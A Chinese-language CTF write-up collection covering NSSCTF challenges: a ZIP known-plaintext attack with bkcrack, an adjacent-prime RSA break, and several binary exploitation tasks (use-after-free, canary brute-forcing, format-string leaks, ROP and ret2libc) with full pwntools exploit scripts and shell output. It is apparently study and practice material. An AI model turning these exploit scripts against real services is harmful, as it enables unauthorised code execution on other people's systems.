# [个人] NSSCTF2026上旬的Writeup

# 2026上旬

## MISC

### [cache007]where_is_pwd

#### 解题过程

下载得到**flag.zip**和**hint.txt**

用**360压缩**打开**flag.zip**得到提示

```shell
5Y6L57yp5bel5YW377yaV2luUkFSNS43MO+8iDY05L2N77yJCuWOi+e8qeaWueW8j++8muato+W4uA==
```

**Base64**解码得到明文

```shell
压缩工具：WinRAR5.70（64位）
压缩方式：正常
```

下载并安装**64位的WinRAR5.70**

用**WinRAR**将**hint.txt**压缩成**hint.zip**

用**bkcrack**执行**已知明文攻击**

```shell
bkcrack.exe -C flag.zip -c hint.txt -P hint.zip -p hint.txt
```

```shell
bkcrack 1.8.1 - 2025-10-25
[12:44:03] Z reduction using 752 bytes of known plaintext
100.0 % (752 / 752)
[12:44:03] Attack on 12833 Z values at index 6
Keys: a923d145 ecc0362d 296a6ff5
2.9 % (373 / 12833)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 373
[12:44:03] Keys
a923d145 ecc0362d 296a6ff5
```

得到**Keys**为

```shell
a923d145 ecc0362d 296a6ff5
```

将加密的压缩包密码改为**123456**

```shell
bkcrack.exe -C flag.zip -k a923d145 ecc0362d 296a6ff5 -U 123456.zip 123456
```

```shell
bkcrack 1.8.1 - 2025-10-25
[12:45:17] Writing unlocked archive 123456.zip with password "123456"
100.0 % (3 / 3)
Wrote unlocked archive.
```

解压得到**FLAG**和**flag.7z**和**hint.txt**

用**WinRAR**或**010**打开**FLAG**看前两行

```
00010000000A0080000300204F532F32
56A3F4CA000000AC00000060636D6170
```

末尾的**63 6D 61 70**转为**ASCII**就是**cmap**这是**字体文件ttf**的标志

将**FLAG**重命名为**FLAG.ttf**并**双击**打开

点击安装FLAG字体

然后用**Word编辑器**打开**hint.txt**编码为**UTF-8**

**全选文字**，**字体改为FLAG**

拉到**最下面**找到

```shell
PWD:LPP&!ifWXG
```

得到密码

```shell
LPP&!ifWXG
```

解压**flag.7z**得到**flag.txt**

查看**flag.txt**的内容

```shell
flag{e31be59a-29e2-436e-a672-fc9d174844b7}
```

**修改flag格式**

**得到：NSSCTF{e31be59a-29e2-436e-a672-fc9d174844b7}**



## CRYPTO

### [SWPUCTF 2021 新生赛]crypto4

#### 解题过程

**查看题目**

```python
from gmpy2 import *
from Crypto.Util.number import *

flag  = '**********'

p = getPrime(512)
q = next_prime(p)
m1 = bytes_to_long(bytes(flag.encode()))


e = 0x10001
n = p*q


flag1 = pow(m1,e,n)
print('flag= '+str(flag1))
print('n= '+str(n))


flag= 10227915341268619536932290456122384969242151167487654201363877568935534996454863939953106193665663567559506242151019201314446286458150141991211233219320700112533775367958964780047682920839507351492644735811096995884754664899221842470772096509258104067131614630939533042322095150722344048082688772981180270243
n= 52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153
```

**最终脚本**

```python
from Crypto.Util.number import inverse, long_to_bytes
from gmpy2 import iroot, next_prime, prev_prime

flag= 10227915341268619536932290456122384969242151167487654201363877568935534996454863939953106193665663567559506242151019201314446286458150141991211233219320700112533775367958964780047682920839507351492644735811096995884754664899221842470772096509258104067131614630939533042322095150722344048082688772981180270243
n= 52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153
e = 0x10001

p = prev_prime(iroot(n, 2)[0])
q = next_prime(p)

while True:
    if p * q == n:
        break
    p = q
    q = next_prime(p)

phi_n = (p - 1) * (q - 1)
d = inverse(e, phi_n)

m = pow(flag, d, n)
flag = long_to_bytes(m).decode()

print(flag)
```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
NSSCTF{no_why}

进程已结束，退出代码为 0
```

**得到：NSSCTF{no_why}**



## PWN

### [NISACTF 2022]UAF

#### 解题过程

**信息搜集**

```shell
file pwn
```

```shell
pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=85bd87e16a35c0c05064a1a0938f6115b8b3b2be, not stripped
```

**分析**

- Linux32位小端序

**查看源码**

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  _DWORD v3[4]; // [esp+8h] [ebp-10h] BYREF

  v3[1] = __readgsdword(0x14u);
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      puts("1.create");
      puts("2.edit");
      puts("3.delete");
      puts("4.show");
      putchar(58);
      __isoc99_scanf("%d", v3);
      if ( v3[0] != 2 )
        break;
      edit();
    }
    if ( v3[0] > 2 )
    {
      if ( v3[0] == 3 )
      {
        del();
      }
      else if ( v3[0] == 4 )
      {
        show();
      }
      else
      {
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v3[0] != 1 )
        goto LABEL_13;
      create();
    }
  }
}
```

```c
int create()
{
  int result; // eax
  int v1; // ebx
  char *v2; // eax

  printf("you are creating the %d page\n", i);
  result = i;
  if ( i >= 0 )
  {
    result = i;
    if ( i <= 9 )
    {
      v1 = i;
      (&page)[v1] = (char *)malloc(8u);
      if ( i )
      {
        if ( i <= 0 || i > 9 )
        {
          return puts("NO PAGE");
        }
        else
        {
          puts("Good cretation!");
          return ++i;
        }
      }
      else
      {
        v2 = page;
        *(_DWORD *)page = 1868654951;
        v2[4] = 0;
        *((_DWORD *)page + 1) = echo;
        puts("The init page");
        return ++i;
      }
    }
  }
  return result;
}
```

```c
unsigned int edit()
{
  int v1; // [esp+8h] [ebp-10h] BYREF
  unsigned int v2; // [esp+Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  puts("Input page");
  __isoc99_scanf("%d", &v1);
  if ( v1 <= 0 || v1 > i )
  {
    puts("NO PAGE");
  }
  else
  {
    puts("Input your strings");
    __isoc99_scanf("%s", (&page)[v1]);
  }
  return __readgsdword(0x14u) ^ v2;
}
```

```c
unsigned int del()
{
  int v1; // [esp+8h] [ebp-10h] BYREF
  unsigned int v2; // [esp+Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  puts("Input page");
  __isoc99_scanf("%d", &v1);
  if ( v1 < 0 || v1 > i )
    puts("NO PAGE");
  else
    free((&page)[v1]);
  return __readgsdword(0x14u) ^ v2;
}
```

```c
unsigned int show()
{
  int v1; // [esp+8h] [ebp-10h] BYREF
  unsigned int v2; // [esp+Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  puts("Input page");
  __isoc99_scanf("%d", &v1);
  if ( v1 )
  {
    if ( v1 <= 0 || v1 > i )
      puts("NO PAGE");
    else
      echo((&page)[v1]);
  }
  else
  {
    (*((void (__cdecl **)(char *))page + 1))(page);
  }
  return __readgsdword(0x14u) ^ v2;
}
```

**分析**

- `del`函数`free`后没将指针指控，存在`uaf`漏洞可利用

  ```c
    if ( v1 < 0 || v1 > i )
      puts("NO PAGE");
    else
      free((&page)[v1]);
    return __readgsdword(0x14u) ^ v2;
  ```

- `show`函数存在任意执行漏洞可利用，但只能利用`index == 0`的堆块

  ```c
    if ( v1 )
    {
      if ( v1 <= 0 || v1 > i )
        puts("NO PAGE");
      else
        echo((&page)[v1]);
    }
    else
    {
      (*((void (__cdecl **)(char *))page + 1))(page);
    }
    return __readgsdword(0x14u) ^ v2;
  ```

- 我们选择先创建0，然后free掉0，再创建1覆盖0，通关给1写入4字节的`sh;\x00`+四字节的`p32(plt@system)`来修改0的内容，进而show出0来执行我们的payload

**最终脚本**

```python
from pwn import *

r = remote("node4.anna.nssctf.cn", 29483)
elf = ELF("./pwn")

r.sendline(b"1") # 0 malloc 8

# free 0
r.sendline(b"3")
r.sendline(b"0")

r.sendline(b"1") # 1->0 malloc 8

# edit 1->0 system("/bin/sh\x00")
r.sendline(b"2")
r.sendline(b"1")
r.sendline(b"sh;\x00" + p32(elf.sym["system"])) # plt@system = 0x80484E0

# show 0
r.sendline(b"4")
r.sendline(b"0")

r.interactive()
```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to node4.anna.nssctf.cn on port 29483
[x] Opening connection to node4.anna.nssctf.cn on port 29483: Trying 1.14.71.254
[+] Opening connection to node4.anna.nssctf.cn on port 29483: Done
[*] 'D:\\Work\\test\\testPython\\src\\com\\probie\\test01\\pwn'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
[*] Switching to interactive mode
1.create
2.edit
3.delete
4.show
:you are creating the 0 page
The init page
1.create
2.edit
3.delete
4.show
:Input page
1.create
2.edit
3.delete
4.show
:you are creating the 1 page
Good cretation!
1.create
2.edit
3.delete
4.show
:Input page
Input your strings
1.create
2.edit
3.delete
4.show
:Input page
ls
bin
dev
flag
lib
lib32
lib64
pwn
cat flag
NSSCTF{b5138e1c-0692-499a-9b85-c9086911e2d4}
```

**得到：NSSCTF{b5138e1c-0692-499a-9b85-c9086911e2d4}**



### [HNCTF 2022 Week1]ezcmp

#### 解题过程

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[32]; // [rsp+0h] [rbp-50h] BYREF
  char src[44]; // [rsp+20h] [rbp-30h] BYREF
  unsigned int seed; // [rsp+4Ch] [rbp-4h]

  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  setbuf(stdout, 0LL);
  puts("GDB-pwndbg maybe useful");
  strcpy(src, "Ayaka_nbbbbbbbbbbbbbbbbb_pluss");
  strcpy(buff, src);
  seed = 1;
  srand(1u);
  enccrypt(buff);
  read(0, buf, 0x1EuLL);
  if ( strncmp(buff, buf, 0x1EuLL) )
  {
    puts("Oh No!You lose!!!");
    exit(0);
  }
  return system("/bin/sh");
}
```

**分析**

- `strncmp(buff, buf, 0x1EuLL)` == `buff.length - buf.length`
- 只要让我们输入的`buf`的内容和加密后的`buff`的内容一样，我们就能得到`shell`
- 我们可以用虚拟机启动`linux`操作系统，然后用`ida`加载`pwn`文件，在`  if ( strncmp(buff, buf, 0x1EuLL) )`处下断点启动调试，然后随便输入一个值`test`再双击`buff`查看加密后`buff`内容

**IDA调试**

```assembly
.bss:0000000000404100 public buff
.bss:0000000000404100 ; char buff[100]
.bss:0000000000404100 buff db 72h, 40h, 0Eh, 0DCh, 0AAh, 78h, 46h, 14h, 0E2h, 0B0h, 7Eh, 4Ch, 1Ah
.bss:0000000000404100                                         ; DATA XREF: enccrypt+61↑o
.bss:0000000000404100                                         ; enccrypt+83↑o ...
.bss:000000000040410D db 0E8h, 0B6h, 84h, 52h, 20h, 0EEh, 0BCh, 8Ah, 58h, 26h, 0F4h, 0C2h, 90h
.bss:000000000040411A db 5Eh, 2Ch, 0CBh, 0C8h, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
.bss:000000000040412E db 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
.bss:0000000000404145 db 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
.bss:000000000040415C db 0, 0, 0, 0, 0, 0, 0, 0
```

**最终脚本**

```python
from pwn import *

r = remote("node5.anna.nssctf.cn", 22287)

payload = bytes([
0x72,0x40,0x0E,0xDC,0xAA,0x78,0x46,0x14,0xE2,0xB0,
0x7E,0x4C,0x1A,0xE8,0xB6,0x84,0x52,0x20,0xEE,0xBC,
0x8A,0x58,0x26,0xF4,0xC2,0x90,0x5E,0x2C,0xCB,0xC8
])

r.sendafter("GDB-pwndbg maybe useful".encode(), payload)

r.interactive()
```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to node5.anna.nssctf.cn on port 22287
[x] Opening connection to node5.anna.nssctf.cn on port 22287: Trying 118.195.175.220
[+] Opening connection to node5.anna.nssctf.cn on port 22287: Done
[*] Switching to interactive mode

ls
bin
dev
easycmp
ezcmp
flag
lib
lib32
lib64
libexec
libx32
cat flag
nssctf{Yo0ur_ggddddb_1s_o00okkk!}
```

**得到：nssctf{Yo0ur_ggddddb_1s_o00okkk!}**



### [CISCN 2023 初赛]funcanary

#### 解题过程

**信息搜集**

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

**分析**

- **Linux64位小端序**
- **GOT表不可写**
- **Canary金丝雀**
- NX栈不可执行
- **PIE地址随机化**
- SHSTK影子栈
- IBT间接分支跟踪

**查看源码**

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  __pid_t v3; // [rsp+Ch] [rbp-4h]

  sub_1243(a1, a2, a3);
  while ( 1 )
  {
    v3 = fork();
    if ( v3 < 0 )
      break;
    if ( v3 )
    {
      wait(0LL);
    }
    else
    {
      puts("welcome");
      sub_128A();
      puts("have fun");
    }
  }
  puts("fork error");
  exit(0);
}
```

```c
unsigned __int64 sub_128A()
{
  _BYTE buf[104]; // [rsp+0h] [rbp-70h] BYREF
  unsigned __int64 v2; // [rsp+68h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  read(0, buf, 0x80uLL);
  return v2 - __readfsqword(0x28u);
}
```

**分析**

- **fork**函数是一个重要的函数，用于在主线程创建一个分线程，创建出来的分线程和主线程的保护机制一样，包括Canary，我们可以利用一点循环爆破Canary
- 主线程 -> 创建分线程 -> 分线程栈溢出 -> 回到主线程 -> 创建分线程 -> 栈不溢出 -> 得到Canary的一位
- **sub_128A**函数存在栈溢出**read(0, buf, 0x80uLL)**
- **buf**可存字节的大小为**104**，但是到**rbp**的距离是**70h**，即**0x70**，即**112**，发现**112-104=8**这8字节就是用来存Canary的
- Canary的结构是**\x00+7个字符**
- 我们如果只覆盖Canary的前几位是不会触发栈溢出检测的，即**'a'*104+'\x00'**不会触发栈溢出检测

**尝试爆破Canary**

```python
from pwn import *

# r = remote("node5.anna.nssctf.cn", 29981)
r = process("./pwn")

canary = ''.encode()
for i in range(8):
    for j in range(0x100):
        print(f"progress({i}/{8} : {hex(j)}/{hex(0x100)})")
        r.sendafter("welcome\n".encode(), cyclic(104) + canary + p8(j))
        if r.recvline().decode().__contains__("fun"):
            canary += p8(j)
            break
print("Canary", hex(u64(canary)))
```

```shell
Canary 0xe34f5cf0d02bc200
```

**分析**

- 因为开了PIE，所以我们的Canary要现爆现用
- 注意一下，我们可以先在本地爆破，这样测试脚本的速度会快很多
- 然后这里用**p8(j)**代替**chr(j).encode()**，这一步是必要的，不然会不稳定支撑不到我们爆破完Canary的8位

然后我们找找有没有后门函数

**数据搜集**

用**IDA**按**Shift+F12**打开**Strings**查看字符串数据，发现存在**/bin/cat flag**

双击点进去

```assembly
.rodata:0000000000002004 command         db '/bin/cat flag',0    ; DATA XREF: sub_1229+8↑o
```

然后单击**command**按**X**快捷键打开**引用**

双击点进引用

```assembly
.text:0000000000001229 sub_1229        proc near
.text:0000000000001229 ; __unwind {
.text:0000000000001229                 endbr64
.text:000000000000122D                 push    rbp
.text:000000000000122E                 mov     rbp, rsp
.text:0000000000001231                 lea     rax, command    ; "/bin/cat flag"
.text:0000000000001238                 mov     rdi, rax        ; command
.text:000000000000123B                 call    _system
.text:0000000000001240                 nop
.text:0000000000001241                 pop     rbp
.text:0000000000001242                 retn
.text:0000000000001242 ; } // starts at 1229
.text:0000000000001242 sub_1229        endp
```

我们构造ROP跳转到这里就能获得Flag了

```assembly
.text:0000000000001231                 lea     rax, command    ; "/bin/cat flag"
```

**分析**

- 因为该程序是部分地址随机化
- 即地址可能是**0xXXXX1231**、**0xXXXX8231**、**0xXXXXa231**、**0xXXXXe231**
- 所以我们只用爆破第四位就可以了概率是**1/f**，即**1/16**

**最终脚本**

```python
from pwn import *

r = remote("node5.anna.nssctf.cn", 29981)
# r = process("./pwn")

canary = ''.encode()
for i in range(8):
    for j in range(0x100):
        print(f"progress({i}/{8} : {hex(j)}/{hex(0x100)})")
        r.sendafter("welcome\n".encode(), cyclic(104) + canary + p8(j))
        if r.recvline().decode().__contains__("fun"):
            canary += p8(j)
            break
# print("Canary", hex(u64(canary)))

backdoor_elf_offset = 0x1231

payload = cyclic(104)
payload += p64(u64(canary))
payload += p64(0xdeadbeef)
payload += p16(backdoor_elf_offset)
while True:
    r.sendafter("welcome\n", payload)
    flag = r.recvline().decode()
    if flag.__contains__("{") & flag.__contains__("}"):
        print(flag)
        break

r.close()
```

```shell
progress(7/8 : 0xda/0x100)
progress(7/8 : 0xdb/0x100)
progress(7/8 : 0xdc/0x100)
progress(7/8 : 0xdd/0x100)
D:\Environment\python\python-3.13.0-amd64\Lib\site-packages\pwnlib\tubes\tube.py:866: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
NSSCTF{d66d848f-e33d-47db-b81f-e205bb0c721e}

[*] Closed connection to node5.anna.nssctf.cn port 29981

进程已结束，退出代码为 0
```

**得到：NSSCTF{d66d848f-e33d-47db-b81f-e205bb0c721e}**



### [GFCTF 2021]where_is_shell

#### 解题过程

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[16]; // [rsp+0h] [rbp-10h] BYREF

  system("echo 'zltt lost his shell, can you find it?'");
  read(0, buf, 0x38uLL);
  return 0;
}
```

**分析**

- **read(0, buf, 0x38uLL)**存在栈溢出

**数据搜集**

```shell
objdump -d pwn | grep "system"
```

```shell
0000000000400430 <system@plt>:
  400430:       ff 25 e2 0b 20 00       jmp    *0x200be2(%rip)        # 601018 <system@GLIBC_2.2.5>
  400557:       e8 d4 fe ff ff          call   400430 <system@plt>
```

```shell
ropper -f pwn --search "pop rdi; ret;"
```

```shell
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi; ret

[INFO] File: pwn
0x00000000004005e3: pop rdi; ret;
```

```shell
ropper -f pwn --search "ret;"
```

```shell
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret;
```

```assembly
.text:0000000000400540 E8 24 30 00 00                                call    near ptr 403569h
```

**分析**

- **chr(int(24, 2)) == '$'**
- **chr(int(30, 2)) == '0'**
- **system("/bin/sh")和system("$0")是等价的**

**最终脚本**

```python
from pwn import *

r = remote("node4.anna.nssctf.cn", 22386)

pop_rdi_ret_elf_addr = 0x4005e3
bin_sh_elf_addr = 0x400540 + 0x1
ret_elf_addr = 0x400416
system_elf_addr = 0x400430

payload = cyclic(0x10)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi_ret_elf_addr) + p64(bin_sh_elf_addr) + p64(ret_elf_addr) + p64(system_elf_addr)
r.sendafter('?'.encode(), payload)

r.interactive()
```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to node4.anna.nssctf.cn on port 22386
[x] Opening connection to node4.anna.nssctf.cn on port 22386: Trying 1.14.71.254
[+] Opening connection to node4.anna.nssctf.cn on port 22386: Done
[*] Switching to interactive mode

ls
bin
dev
flag
lib
lib32
lib64
pwn
cat flag
NSSCTF{506e3650-0d25-474f-b6c2-742d1707be48}
```

**得到：NSSCTF{506e3650-0d25-474f-b6c2-742d1707be48}**



### [深育杯 2021]find_flag

#### 解题过程

**信息搜集**

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

**分析**

- 保护全开

**查看源码**

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  __gid_t rgid; // [rsp+Ch] [rbp-4h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  sub_1240();
  sub_132F();
  return 0LL;
}
```

```c
unsigned __int64 sub_132F()
{
  char format[32]; // [rsp+0h] [rbp-60h] BYREF
  _BYTE v2[56]; // [rsp+20h] [rbp-40h] BYREF
  unsigned __int64 v3; // [rsp+58h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Hi! What's your name? ");
  gets(format);
  printf("Nice to meet you, ");
  strcat(format, "!\n");
  printf(format);
  printf("Anything else? ");
  gets(v2);
  return __readfsqword(0x28u) ^ v3;
}
```

**分析**

- 两个栈溢出
- 一个格式化输出
- 我们可用先用第一个输入来泄露elf_base_addr和canary
- 然后用第二个输入来跳转到后门函数

**数据搜集**

```assembly
.text:0000000000001229 sub_1229        proc near
.text:0000000000001229 ; __unwind {
.text:0000000000001229                 endbr64
.text:000000000000122D                 push    rbp
.text:000000000000122E                 mov     rbp, rsp
.text:0000000000001231                 lea     rdi, command    ; "/bin/cat flag.txt"
.text:0000000000001238                 call    _system
.text:000000000000123D                 nop
.text:000000000000123E                 pop     rbp
.text:000000000000123F                 retn
.text:000000000000123F ; } // starts at 1229
.text:000000000000123F sub_1229        endp
```

**分析**

- 发现后门函数**0x1231**

```shell
%1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p %10$p
```

```shell
0x7fff67da5830 0x32 0xffffffffffffffcc 0x7f167566f700 0x12 0x2432252070243125 0x2520702433252070 0x7024352520702434 0x3725207024362520 0x2070243825207024!
```

```shell
%11$p %12$p %13$p %14$p %15$p %16$p %17$p %18$p %19$p %20$p 
```

```shell
0x2070243831252070 0x3225207024393125 0xa21702430 (nil) 0x7ffc2bd6adb0 0x555c4328d140 0xbabc533e97af7100 0x7ffc2bd6add0 0x555c4328d46f 0x7ffc2bd6aeb0!
```

**分析**

- 有的人会在这一步选择用pwngdb利用fmtarg来泄露addr的偏移，但其实这是不严谨的因为你没有这个elf的libc，你泄露的偏移是基于你本地的libc来计算的
- **在x86_64中pie的addr通常以0x55/0x56开头**，所以我们猜测**%16$p的0x555c4328d140**是elf_addr
- **canary以00结尾**，所以我们猜测**%17$p的0xbabc533e97af7100**是canary
- **%16$p是elf_addr而不是elf_base_addr**，但我们知道elf_base_addr通常以000结尾所以我们要减去尾数，即减去(0x0140 + 0x1000 * n)这一个整体来计算得到elf_base_addr

**最终脚本**

```python
from pwn import *

i = -1
while True:
    i += 1

    r = remote("node4.anna.nssctf.cn", 29567)

    # 第一个gets泄露数据
    payload = "|%16$p|%17$p|".encode()
    r.sendlineafter("? ".encode(), payload)

    # 获取elf_addr并遍历计算elf_base_addr
    r.recvuntil('|'.encode())
    elf_addr = int(r.recvuntil('|'.encode()).decode().replace('|', ''), 16)
    elf_offset = 0x0140 + 0x1000 * i
    elf_base_addr = elf_addr - elf_offset
    print("elf_base_addr", hex(elf_base_addr))

    # 获取canary
    canary = int(r.recvuntil('|'.encode()).decode().replace('|', ''), 16)
    print("canary", hex(canary))

    # 后门函数
    backdoor_elf_offset = 0x1231
    backdoor_elf_addr = elf_base_addr + backdoor_elf_offset

    # 第二个gets跳转到后门函数
    payload = cyclic(56)
    payload += p64(canary)
    payload += p64(0xdeadbeef)
    payload += p64(backdoor_elf_addr)
    r.sendlineafter("? ".encode(), payload)

    # 如果发现了存在flag的输出则输出flag并退出
    # 否则继续遍历elf_base_addr
    try:
        print(r.recvline().decode())
        break
    except EOFError:
        r.close()
```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to node4.anna.nssctf.cn on port 29567
[x] Opening connection to node4.anna.nssctf.cn on port 29567: Trying 1.14.71.254
[+] Opening connection to node4.anna.nssctf.cn on port 29567: Done
elf_base_addr 0x55ed8af5d000
canary 0x3959a2262e587800
[*] Closed connection to node4.anna.nssctf.cn port 29567
[x] Opening connection to node4.anna.nssctf.cn on port 29567
[x] Opening connection to node4.anna.nssctf.cn on port 29567: Trying 1.14.71.254
[+] Opening connection to node4.anna.nssctf.cn on port 29567: Done
elf_base_addr 0x564b337ad000
canary 0xf85bc34cec72de00
NSSCTF{75ed1d3e-b6cc-4f7d-a5c7-99c872d20ac0}

[*] Closed connection to node4.anna.nssctf.cn port 29567

进程已结束，退出代码为 0
```

**得到：NSSCTF{75ed1d3e-b6cc-4f7d-a5c7-99c872d20ac0}**



### [BJDCTF 2020]babyrop

#### 解题过程

**信息搜集**

```shell
checksec --file=pwn
```

```shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73 Symbols        No    0      1pwn
```

**分析**

- 无保护

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  vuln();
  return 0;
}
```

```c
ssize_t vuln()
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("Pull up your sword and tell me u story!");
  return read(0, buf, 0x64uLL);
}
```

**分析**

- 这里**read(0, buf, 0x64uLL)**存在栈溢出

**数据搜集**

**分析**

- 本题**无后门函数**
- 本题**无system@plt**
- 本题**无/bin/sh**
- 猜测要**自己猜测libc然后ret2libc**

**最终脚本**

```python
from pwn import *
from LibcSearcher import LibcSearcher

# 配置信息
context.os = "linux"
context.arch = "amd64"

# 连接资源
r = remote("node4.anna.nssctf.cn", 24589)
elf = ELF("./pwn")
rop = ROP(elf)

# 数据搜集
ret_elf_addr = rop.find_gadget(["ret"])[0]
pop_rdi_ret_elf_addr = rop.find_gadget(["pop rdi", "ret"])[0]
puts_got_elf_addr = elf.got["puts"]
puts_plt_elf_addr = elf.plt["puts"]
read_got_elf_addr = elf.got["read"]
read_plt_elf_addr = elf.plt["read"]
vuln_elf_addr = elf.sym["vuln"]

# 泄露puts_got_libc_addr
payload = cyclic(0x20)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi_ret_elf_addr) + p64(puts_got_elf_addr) + p64(ret_elf_addr) + p64(puts_plt_elf_addr) + p64(vuln_elf_addr)
r.sendafter("!\n".encode(), payload)

# 接收puts_got_libc_addr
puts_got_libc_addr = u64(r.recvuntil('\x7f'.encode(), drop=False)[-6:].ljust(8, '\x00'.encode()))

# 泄露read_got_libc_addr
payload = cyclic(0x20)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi_ret_elf_addr) + p64(read_got_elf_addr) + p64(ret_elf_addr)  + p64(puts_plt_elf_addr) + p64(vuln_elf_addr)
r.sendafter("\n".encode(), payload)

# 接收read_got_libc_addr
read_got_libc_addr = u64(r.recvuntil('\x7f'.encode(), drop=False)[-6:].ljust(8, '\x00'.encode()))

# 猜测libc
libc = LibcSearcher("puts", puts_got_libc_addr)
libc.add_condition("read", read_got_libc_addr)

# 计算libc_base_addr
puts_libc_offset = libc.dump("puts")
libc_base_addr = puts_got_libc_addr - puts_libc_offset

# 数据搜集
system_libc_addr = libc_base_addr + libc.dump("system")
bin_sh_libc_addr = libc_base_addr + libc.dump("str_bin_sh")

# get shell
payload = cyclic(0x20)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi_ret_elf_addr) + p64(bin_sh_libc_addr) + p64(ret_elf_addr) + p64(system_libc_addr)
r.sendafter("!\n".encode(), payload)

# 交互
r.interactive()
```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test02\Main.py 
[x] Opening connection to node4.anna.nssctf.cn on port 24589
[x] Opening connection to node4.anna.nssctf.cn on port 24589: Trying 1.14.71.254
[+] Opening connection to node4.anna.nssctf.cn on port 24589: Done
[*] 'D:\\Work\\test\\testPython\\src\\com\\probie\\test02\\pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] Loaded 14 cached gadgets for './pwn'
[+] There are multiple libc that meet current constraints :
0 - libc6_2.23-0ubuntu10_amd64
1 - libc6_2.23-0ubuntu11_amd64
[+] Choose one : 0
[*] Switching to interactive mode
ls
bin
boot
dev
etc
flag
flag.txt
home
lib
lib32
lib64
media
mnt
opt
proc
pwn
root
run
sbin
srv
sys
tmp
usr
var
cat flag
NSSCTF{fea0d22e-8c52-4f10-ac19-a36297397452}
```

**得到：NSSCTF{fea0d22e-8c52-4f10-ac19-a36297397452}**



### [MoeCTF 2021]babyrop

#### 解题过程

**查看源码**

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  puts("Hello,here is lacanva\n");
  puts("I'm a fan of vtubers\n");
  puts("But one day Nana7mi and Azi start their live boradcast at the same time\n");
  puts("Whose live boradcast should I watch?");
  puts("Can you give me some advise?");
  vuln(&argc);
  return 0;
}
```

```c
int vuln()
{
  char s[36]; // [esp+0h] [ebp-28h] BYREF

  gets(s);
  return 0;
}
```

**最终脚本**

```python
from pwn import *

r = remote("node5.anna.nssctf.cn", 27962)
elf = ELF("./pwn")

payload = cyclic(0x28 + 0x4)
payload += p32(elf.plt["gets"]) + p32(elf.plt["system"]) + p32(elf.bss()) + p32(elf.bss())
r.sendlineafter("advise?\n".encode(), payload)

r.interactive()
```

```shell
